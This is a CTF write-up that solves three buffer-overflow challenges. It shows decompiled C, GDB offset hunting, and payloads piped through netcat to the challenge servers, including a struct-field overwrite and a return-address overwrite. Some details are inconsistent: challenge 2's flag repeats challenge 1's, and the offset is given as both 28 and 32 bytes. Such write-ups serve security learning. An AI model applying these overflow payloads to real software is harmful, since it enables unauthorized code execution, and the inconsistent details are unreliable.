# [Each in The Shell](https://intheshell.page/) CTF - Binary Exploitation Challenge

## Introduction

This challenge is part of the ["Each in The Shell" (EiTS)](https://intheshell.page/) binary exploitation (binexp) CTF, divided into three parts. Each stage must be completed to progress to the next one.

---

## **Challenge 1:**

I downloaded the `desafio` and the `desafio.c` file, and I opened the binary with IDA64 for analysis. Let's take a look at the `main` function:

```c
undefined8 main(void)
{
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  printf("Qual o seu nome?\n> ");
  __isoc99_scanf(&DAT_0049501c,usuario);
  if (usuario[32] == '\0') {
    printf("Ola %s, voce nao tem permissao para ver a flag\n",usuario);
  }
  else {
    printf("Ola %s, aqui esta a sua flag: %s\n",usuario,"eits{REMOVIDA}");
  }
  return 0;
}
```

In this function, we see an `if` statement that checks if the character at position 32 in the `usuario` string is null ('\0'). If it's null, it displays the message: you do not have permission to see the flag. Otherwise, it displays "Aqui está sua flag: eits{REMOVIDA}." (Here is your flag: eits{REMOVED})

To see the flag, you need to ensure that the character at position 32 of the `usuario` string is not '\0'. This means the `usuario` string must be at least 32 characters long to avoid the null character being at position 32.

So, you can provide a string with 32 characters or more, where position 32 contains, for example, 'a' to see the flag. Something like:

```bash
❯ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc ctf-ps.intheshell.page 5000
Qual o seu nome?
> Ola aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, aqui esta a sua flag: eits{gr1t4nd0_qu3_53_r3s0lv3}
```

In this case, the first 32 characters are "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa," and the null character ('\0') is not at position 32, allowing you to see the flag: **eits{gr1t4nd0_qu3_53_r3s0lv3}**

Now, let's move on to the next challenge:

## **Challenge 2:**
I downloaded two files again (desafio and `desafio.c` again). Let's look at the `desafio.c` file with any text editor:

```c
if (usuario.id <= 0 || usuario.id > (int) sizeof(mensagens)) {
	printf("Usuario inexistente\n");
} else {
	// usuario.id == 1 ou 2
	// queremos o id == 1
	printf("Mensagem: %s\n", mensagens[usuario.id - 1]);
}
```

We want to ensure we enter the `else` block, so we need to negate the condition in the `if` statement. We want `id` to be greater than 0 and less than the size of `mensagens`, which is 2. This means we want `id` to be 1 or 2.

If `id` is 2, the message displayed is `mensagens[1] = "Você não tem permissão" (You do not have permission)` So, we want `id` to be 1.

Knowing that the struct stores the variables side by side in physical memory, and that we are entering the user's name, the memory layout is as follows:

```
|----|--|
|name|id|
|----|--|
```

Figuratively, the name occupies a "house" of 4 hyphens. If we provide a name longer than what can fit in this "house," we will overflow into the space of `id`, and we can change the current value (2) to 1.

So, we need to determine how many "houses" or characters we have to put in the name to "overflow" and change the value of `id`. The size of the name in the struct is 32 bytes. To confirm, we can run the following line:

```c
printf("%lu\n", sizeof(char)); // 1 byte
```

We can check the size of an integer in the same way:

```c
printf("%lu\n", sizeof(int)); // 4 bytes
```

Or we can see the size of the struct directly:

```c
printf("%lu\n", sizeof(usuario)); // 36 bytes
```

What matters is that we know the number of spaces the name occupies is 32 bytes, and `id` occupies 4 bytes. This totals 36 bytes.

So, it's straightforward to change the `id` value; we simply pass a string with 36 bytes, with the last 4 bytes representing the new `id`. 

In this case, I'll pass 32 'A' characters to fill the name and then append the value 1 in hexadecimal to occupy the last 4 bytes:

```bash
❯ python -c 'print("A"*32 + "\x01\x00\x00\x00")' | ./desafio
Qual o seu nome?
> Ola, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Mensagem: eits{RETIRADA}
```

> \* We send values in hexadecimal backward because most computer architectures use "Little Endian" memory storage, where the least significant byte comes first in memory. 

Now, I'll use this approach with netcat (nc):

```bash
python -c 'print("A"*32 + "\x01\x00\x00\x00")' | nc ctf-ps.intheshell.page 5001
```

As a result, it prints the hidden flag:

```
Qual o seu nome?
> Ola, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Mensagem: eits{gr1t4nd0_qu3_53_r3s0lv3}
```

## **Challenge 3:**

For this challenge, I downloaded the code source (`desafio.c`) and the binary file. First, let's examine the `desafio.c` file:

- We aim to run the `vitoria` function, which prints the flag. However, this function is never called in the code. Let's run the program:

```bash
chmod +x desafio # Permission to execute the binary
./desafio
```

It prints the address of the `vitoria` function in memory:

```
O alvo: 0x80497a5
Mensagem
> ^C
```

At this point, connecting all the pieces together, we know this is another case of buffer overflow. This time, we also have a `scanf` function to exploit. Looking at the code again, the input read by `scanf` is passed to another function, concatenated with another string, and stored in a 32-byte buffer.

In this challenge, the goal is to overwrite the Instruction Pointer (EIP), which stores the address of the next instruction to be executed, with the address of the "vitoria" function (which we already have = **0x80497a5**). 

Let's run the program and intentionally cause an error by providing a very long string:

```bash
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
```

Next, we can check the value of the EIP register using GDB:

```bash
(gdb) ./desafio
(gdb) run
(gdb) info registers
```

You will notice that the EIP register is overwritten with a pattern, like "HHHH," which is equivalent to 0x48484848 in hexadecimal (ASCII 'H'). This indicates that we need 28 bytes to "overflow" the buffer and overwrite the EIP.

Now, we can craft a string with 32 bytes to overflow the buffer and overwrite the EIP with the address of the `vitoria` function. Since we are working with Little Endian, we need to write the address backward. You can use Python for this, but in my Python version (3.11.5), I didn't have success. Alternatively, you can use `echo` to achieve the desired result:

```bash
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08" | ./desafio
```

Now, you can apply the same approach with netcat:

```bash
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08"  | nc ctf-ps.intheshell.page 5002
```

As a result, it prints the flag:  **eits{v1t0r14_1lc4nc4d4!}**
